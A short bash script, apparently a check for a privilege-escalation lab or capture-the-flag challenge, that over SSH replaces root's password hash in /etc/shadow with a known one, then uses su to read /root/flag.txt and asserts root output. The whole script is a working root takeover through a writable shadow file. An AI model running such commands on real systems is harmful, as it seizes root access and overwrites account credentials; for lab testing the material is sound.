#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
HASH=$(openssl passwd -1 -salt xx password)
# Replace root hash line
awk -F: -v h="$HASH" '\''BEGIN{OFS=FS} $1=="root"{$2=h} {print}'\'' /etc/shadow > /tmp/shadow.new
cat /tmp/shadow.new > /etc/shadow
printf "%s\n" "password" | su - root -c "cat /root/flag.txt"
')"
assert_root_output "${out}"
